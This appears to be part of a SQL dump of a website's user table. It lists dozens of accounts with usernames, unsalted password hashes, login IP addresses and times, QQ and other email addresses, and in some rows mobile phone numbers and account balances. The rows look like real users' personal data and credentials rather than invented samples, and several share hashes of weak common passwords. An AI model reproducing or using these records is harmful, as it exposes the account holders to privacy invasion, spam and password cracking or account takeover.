(37, '1161111002', 'bbf1f217cac82a965f28ce24680d359ae6bc95a7', '2017-04-05 19:34:31', '112.116.113.220', 0.01, 10, '1161111002', NULL, 0, '1161111002@qq.com', 0, '1161111002', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'bbf1f217cac82a965f28ce24680d359ae6bc95a7', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(38, 'shenchi', '614950a354dd76a3e2f88286c65f7dd2c3068a14', '2017-04-07 13:13:27', '218.86.154.133', 0.01, 10, 'shenchi', NULL, 0, '1239752776@qq.com', 0, '1239752776', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '614950a354dd76a3e2f88286c65f7dd2c3068a14', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(39, 'ceshi', '3609740fd6c63ded213f4aef5d34f37d86a81a14', '2017-04-07 20:21:12', '183.222.131.38', 0.00999832, 10, '测试', NULL, 0, '63748052@qq.com', 0, '63748052', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3609740fd6c63ded213f4aef5d34f37d86a81a14', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(40, '123456', '6251e74a22ee420bfc543a4a3737181e2fa1b1d9', '2017-04-08 12:36:34', '223.104.90.74', 1.01, 0, '123456', NULL, 0, '123456789@qq.com', 0, '123456789', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(41, 'shineshi', '2ea6201a068c5fa0eea5d81a3863321a87f8d533', '2017-04-09 11:36:10', '113.88.82.82', 56410, 20, 'shineshi', '13556860160', 1, 'shineshi@126.com', 0, '301242', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, '', '17431', NULL, NULL, NULL, NULL, '2ea6201a068c5fa0eea5d81a3863321a87f8d533', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(42, 'aaa123', '360e46f15f432af83c77017177a759aba8a58519', '2017-05-03 23:03:52', '182.131.125.214', 0.01, 10, 'aaa123', NULL, 0, '54325435@qq.com', 0, '543654354', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '360e46f15f432af83c77017177a759aba8a58519', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(43, 'lisi135', '1e9c48fedb74c408cfa764c2e6579345ad38b059', '2017-05-04 00:53:20', '39.128.40.228', 0.01, 10, 'lisi', NULL, 0, '234532453@qq.com', 0, '342532534', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(44, 'qweqwe123123', '8d787078c40ab19c6ffbf9713daf35fd5c111e48', '2017-05-04 09:23:32', '27.192.37.159', 0.01, 10, 'qweqwe123123', NULL, 0, 'qweqwe123123@qq.com', 0, 'qweqwe123123', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8d787078c40ab19c6ffbf9713daf35fd5c111e48', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(45, 'htxss', '90977dae947626b92822a7519e9a802c9d5f9f4f', '2017-05-04 09:25:56', '110.182.204.34', -0.000000000223517, 10, 'htxss', '15325096317', 0, '744691045@qq.com', 0, '744691045', NULL, '2019-05-12 01:17:29', NULL, NULL, 573, 'Eeee', 'Ffdd', 'Ddddf', NULL, 0, 1, 0, 2, NULL, NULL, '341347', NULL, NULL, NULL, NULL, NULL, '90977dae947626b92822a7519e9a802c9d5f9f4f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0.01, '2019-08-02 23:34:53', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '0500999001557595049', NULL, NULL),
(46, '78522394', '40d92b7b4b94a4b105f07e2373bbc7d1a0a1a014', '2017-05-05 17:53:20', '14.17.37.143', 42.01, 10, '78522394', NULL, 0, '78522394@qq.com', 0, '78522394', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '40d92b7b4b94a4b105f07e2373bbc7d1a0a1a014', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(47, 'lttg', '67ebf6fb7c97c885389ca60cc8251d10d0ed93ef', '2017-05-07 14:36:19', '36.149.71.177', 0.01, 20, 'lttg', NULL, 0, '6327467363@qq.com', 0, '6327467363', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(48, 'sunhuan', 'ab339c90b3f2d06efa4caf8e91224e8de7ad2c26', '2017-05-07 22:53:47', '118.205.173.84', 0, 20, 'nimei', '18958115563', 0, '1212@qq.co', 0, '323123', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, '286180', '17822', NULL, NULL, NULL, NULL, 'ab339c90b3f2d06efa4caf8e91224e8de7ad2c26', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(49, '123654', 'b2ee60370ad57d9bc3877e9024c507ab99303a64', '2017-05-08 07:32:07', '182.241.165.3', 0.01, 20, '123654', NULL, 0, '123654@qq.com', 0, '123654', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b2ee60370ad57d9bc3877e9024c507ab99303a64', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(50, 'qweqwe', 'f4542db9ba30f7958ae42c113dd87ad21fb2eddb', '2017-05-08 10:40:08', '27.214.234.195', 0.01, 10, 'qweqwe', NULL, 0, 'qweqwe@qq.com', 0, 'qweqwe', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f4542db9ba30f7958ae42c113dd87ad21fb2eddb', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(51, 'ceshi6688', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2017-05-08 20:20:45', '112.231.38.10', 0.01, 10, '112233', NULL, 0, '1109349312@qq.com', 0, '1109349312', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(53, '1445682140', 'f243bb04c44f0ef124cb4452492a8919aebcb0fd', '2017-05-10 08:33:20', '111.30.81.121', 20, 10, '想你所爱', NULL, 0, '1445682140@qq.com', 0, '1445682140', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f243bb04c44f0ef124cb4452492a8919aebcb0fd', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(55, 'yinters', '27e85ccad748d04ab01f54ce6c7244e33e751ac0', '2017-05-11 21:29:54', '59.46.38.53', 9900.01, 10, 'yinters', NULL, 0, '1310045114@qq.com', 0, '1310045114', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '27e85ccad748d04ab01f54ce6c7244e33e751ac0', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(56, '67009859', '450b19d6b8ba014e08e8904d6e32cd9ecb384014', '2017-05-12 10:07:20', '60.171.240.222', 0.01, 10, 'erer', NULL, 0, '67009859@qq.com', 0, '67009859', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '450b19d6b8ba014e08e8904d6e32cd9ecb384014', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(57, 'asdasd', '00ea1da4192a2030f9ae023de3b3143ed647bbab', '2017-05-12 22:00:30', '58.211.2.36', 0.01, 10, 'asdasd', NULL, 0, '1234134@qq.com', 0, '12312323', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '00ea1da4192a2030f9ae023de3b3143ed647bbab', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(58, 'mingjia314', 'a02244f110b34dc4a54e8dace6b97afab94d549a', '2017-05-13 09:45:19', '117.34.13.96', 0.01, 10, 'sdfsjlkf', NULL, 0, '23424@126.com', 0, '23424', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a02244f110b34dc4a54e8dace6b97afab94d549a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(59, '37256780', '9ab5f4bf60134ec858fc615d2e0d2f57518dbf64', '2017-05-13 20:56:17', '117.34.13.30', 5175.02, 10, '37256780', NULL, 0, '37256780@dms.com', 0, '37256780', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, '43938', NULL, NULL, NULL, NULL, '9ab5f4bf60134ec858fc615d2e0d2f57518dbf64', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(60, 'cxz11', '1e9c48fedb74c408cfa764c2e6579345ad38b059', '2017-05-15 10:14:43', '117.34.13.12', 0.01, 10, 'qqqqq', NULL, 0, '231321321@qq.com', 0, '231321321', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1e9c48fedb74c408cfa764c2e6579345ad38b059', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(61, '645648545', 'f83a04ce33d6a4391dab6293169fc76cc3ea3a11', '2017-05-15 10:23:20', '101.227.207.48', 0.01, 10, '645648545', NULL, 0, '645648545@qq.com', 0, '645648545', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f83a04ce33d6a4391dab6293169fc76cc3ea3a11', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(62, 'qq1494866186267', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2017-05-16 00:36:26', '42.236.93.26', 0.01, 10, 'A01挂神团队', NULL, 0, NULL, 0, '979143', NULL, '2014-10-15 00:00:00', 'B08EE541D70E88107119B3D0888A6024', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(63, 'yintersyinters', 'd5c8b6a56dbcf8a845d18bcba5b86b4c313c83cf', '2017-05-16 17:10:16', '58.211.2.6', 0.01, 10, 'yintersyinters', '', 0, '2342344@qq.com', 0, '234234444', '', '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c41ff190906b1dd596e598b14c7e2e98f8541fd7', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '普通会员', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(64, 'kfcms', 'a4413cec7ec021c070c9d934b873a41e9eeebd24', '2017-05-22 23:25:16', '117.34.13.60', 0.01, 20, 'kfcms', NULL, 0, '1745000861@qq.com', 0, '1745000861', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a4413cec7ec021c070c9d934b873a41e9eeebd24', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(65, 'abcd', '6359ea3793d3462e6349edbe487b570c6a95a748', '2017-05-23 00:32:35', '116.31.126.101', 0.01, 10, '阿强', NULL, 0, '34534@qq.com', 0, '3453453', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6359ea3793d3462e6349edbe487b570c6a95a748', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(66, 'luos', '3e69b9de0d3d1a892b9e231a9b4e5b4e68f95749', '2017-05-27 13:41:35', '115.231.186.36', 0.01, 20, '123132', NULL, 0, '411321@qq.com', 0, '121321', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3e69b9de0d3d1a892b9e231a9b4e5b4e68f95749', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(67, 'asdasd234234', 'bc50ae68f866c81f75135218f188bb7a0e49ed1c', '2017-06-13 12:04:50', '59.51.81.178', 0.01, 20, '21312312', NULL, 0, '123123@qq.com', 0, '3123123', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'bc50ae68f866c81f75135218f188bb7a0e49ed1c', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(68, 'hanxikm', 'b2f1c6266b63ff94d5544b8207eefc11b8574ca8', '2017-06-21 11:41:27', '115.231.186.72', 0.01, 10, '229076188', NULL, 0, '229076188@qq.com', 0, '229076188', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b2f1c6266b63ff94d5544b8207eefc11b8574ca8', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(69, '2207689325', 'e91c36808218b5672d1d411faec7cb0ece64323e', '2017-06-23 05:26:17', '116.31.126.211', 0.01, 10, '合买源源', '18076762063', 0, '2207689325@qq.com', 0, '2207689325', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, '652563', '43267', NULL, NULL, NULL, NULL, 'e91c36808218b5672d1d411faec7cb0ece64323e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(70, 'weidnjdn', '60af4f7366a8b7501c07940466624ad9d5a6e3f7', '2017-06-24 23:18:28', '116.31.126.105', 0.01, 10, 'weidnjdn', NULL, 0, 'weidnjdn@qq.com', 0, 'weidnjdn', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '60af4f7366a8b7501c07940466624ad9d5a6e3f7', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(71, '885617196', 'e0e35e76028d3f9be4bdbf2a0ac6e862f09b28dc', '2017-06-30 01:23:57', '223.157.220.85', 0.01, 10, '885617196', NULL, 0, '885617196@qq.com', 0, '', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e0e35e76028d3f9be4bdbf2a0ac6e862f09b28dc', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(92, '123456789', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', '2017-08-18 07:17:37', '113.94.55.151', 0.01, 10, '123456789', NULL, 0, '123456789@qq.com', 0, '', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(93, 'sk88214', '1617682d8f2795a08917e87adea90e8a290c5cc6', '2017-08-19 08:29:39', '182.242.169.227', 0.01, 20, 'd5454as', NULL, 0, '3239131@qq.com', 0, '3239131', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1617682d8f2795a08917e87adea90e8a290c5cc6', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(94, 'yc888', 'c53255317bb11707d0f614696b3ce6f221d0e2f2', '2017-08-19 23:47:03', '125.78.90.207', 0.01, 10, 'yc888', NULL, 0, '931348235@qq.com', 0, '', NULL, '2018-02-15 11:16:02', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c53255317bb11707d0f614696b3ce6f221d0e2f2', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(95, 'qq150345401458', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2017-08-23 10:06:54', '120.229.103.164', 0.01, 10, '自导', NULL, 0, NULL, 0, NULL, NULL, '2014-10-15 00:00:00', '8C7ED7E84B20AFF7CFC1A489E2C66BAB', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(96, 'yizihan', 'd0d005f344455c2a9eae48c674cb9ac6e048c863', '2017-08-31 16:51:25', '171.92.217.8', 0.01, 10, 'xiuxiu', NULL, 0, '6530550@qq.com', 0, '6530550', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd0d005f344455c2a9eae48c674cb9ac6e048c863', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(97, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', '2017-09-01 21:14:21', '111.198.38.182', 0.01, 20, 'admin', NULL, 0, 'admin@admin.com', 0, '', NULL, '2019-01-03 15:45:34', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd033e22ae348aeb5660fc2140aec35850c4da997', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(98, 'bu9527', '989ee334f2974fc3ca21920f58aa168683f6d9fb', '2017-09-03 14:25:09', '39.90.33.216', 0.01, 10, '是滴是滴', NULL, 0, 'bu527@qq.com', 0, '6598654754', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(99, 'hack', '601f1889667efaebb33b8c12572835da3f027f78', '2017-09-03 19:53:56', '113.248.157.83', 0.01, 10, 'hack', NULL, 0, '55444@qq.com', 0, '444444', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '601f1889667efaebb33b8c12572835da3f027f78', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(100, 'qq112751', 'a4683978daa00d5f211df3dba86351ea786e11a3', '2017-09-05 17:16:43', '221.222.68.12', -0.000000000447035, 10, '久爱', NULL, 0, '17642584@qq.com', 0, '17642584', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a4683978daa00d5f211df3dba86351ea786e11a3', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(101, 'keleck', '065babf6a779a954b4a803007eedf38e29637922', '2017-09-05 17:59:02', '113.68.130.143', 0.01, 10, '111', NULL, 0, '370686136@qq.com', 0, '370686136', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '065babf6a779a954b4a803007eedf38e29637922', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(102, 'aulykkk', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2017-09-06 01:45:08', '125.116.208.181', 0.01, 10, 'aulykkk', NULL, 0, '355@163.com', 0, '71004644', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(103, '1234569', 'dd5fef9c1c1da1394d6d34b248c51be2ad740840', '2017-09-06 10:55:14', '223.96.220.207', 0.01, 20, '44', NULL, 0, '709338141@qq.com', 0, '709338141', NULL, '2014-10-15 00:00:00', NULL, NULL, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
